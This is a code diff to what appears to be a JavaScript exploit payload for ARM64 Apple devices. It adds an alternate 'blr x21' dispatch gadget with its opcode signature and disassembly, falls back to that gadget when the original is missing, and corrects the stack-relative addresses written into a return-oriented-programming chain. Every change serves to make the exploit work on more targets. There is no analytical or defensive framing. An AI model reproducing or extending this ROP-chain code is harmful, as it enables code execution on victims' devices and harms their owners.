@@ -154,6 +154,14 @@
         // 0x180d62e58      ff030191       add sp, sp, 0x40
         // 0x180d62e5c      c0035fd6       ret
 
+        // alt dispatch:
+        // 0x1811a37f0      a0023fd6       blr x21
+        // 0x1811a37f4      bf8300d1       sub sp, x29, 0x20
+        // 0x1811a37f8      fd7b42a9       ldp x29, x30, [sp, 0x20]
+        // 0x1811a37fc      f44f41a9       ldp x20, x19, [sp, 0x10]
+        // 0x1811a3800      f657c3a8       ldp x22, x21, [sp], 0x30
+        // 0x1811a3804      c0035fd6       ret
+
         // stackloader:
         // 0x18098e2a8      fd7b46a9       ldp x29, x30, [sp, 0x60]
         // 0x18098e2ac      f44f45a9       ldp x20, x19, [sp, 0x50]
@@ -235,6 +243,8 @@
                 "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
                 // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
                 "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
+                "altdispatch": [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
                 // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
                 // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
                 "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
@@ -376,6 +386,11 @@
                 fsyms(memory, base, segs, lookup, syms);
             }
         }
+        if(!gadgets['dispatch'])
+        {
+            gadgets['dispatch'] = gadgets['altdispatch'];
+        }
+        delete opcodes['altdispatch'];
         var k = Object.values(libs).reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
         for(var i = 0; i < k.length; ++i)
         {
@@ -552,8 +567,9 @@
             arr[pos++] = 0xdead0019;                // x20 (unused)
             arr[pos++] = 0xdead001a;                // x19 (unused)
             arr[pos++] = 0xdead001b;                // x19 (unused)
-            arr[pos++] = 0xdead001c;                // x29 (unused)
-            arr[pos++] = 0xdead001d;                // x29 (unused)
+            var tmppos = pos;
+            arr[pos++] = Add(stack, tmppos*4).lo(); // x29 (unused)
+            arr[pos++] = Add(stack, tmppos*4).hi(); // x29 (unused)
             arr[pos++] = regloader.lo();            // x30 (first gadget)
             arr[pos++] = regloader.hi();            // x30 (first gadget)
 
@@ -602,8 +618,9 @@
             arr[pos++] = func.hi();                 // x21 (target for dispatch)
             arr[pos++] = 0xdead0018;                // x20 (unused)
             arr[pos++] = 0xdead0019;                // x20 (unused)
-            arr[pos++] = Add(stack, pos*4).lo();    // x19 (scratch address for str x8, [x19])
-            arr[pos++] = Add(stack, pos*4).hi();    // x19 (scratch address for str x8, [x19])
+            var tmppos = pos;
+            arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
+            arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
             arr[pos++] = 0xdead001c;                // x29 (unused)
             arr[pos++] = 0xdead001d;                // x29 (unused)
             arr[pos++] = ldrx8.lo();                // x30 (next gadget)
@@ -661,8 +678,9 @@
                 arr[pos++] = func.hi();                 // x21 (target for dispatch)
                 arr[pos++] = 0xdaad0018;                // x20 (unused)
                 arr[pos++] = 0xdaad0019;                // x20 (unused)
-                arr[pos++] = Add(stack, pos*4).lo();    // x19 (scratch address for str x8, [x19])
-                arr[pos++] = Add(stack, pos*4).hi();    // x19 (scratch address for str x8, [x19])
+                tmppos = pos;
+                arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
+                arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
                 arr[pos++] = 0xdaad001c;                // x29 (unused)
                 arr[pos++] = 0xdaad001d;                // x29 (unused)
                 arr[pos++] = ldrx8.lo();                // x30 (next gadget)
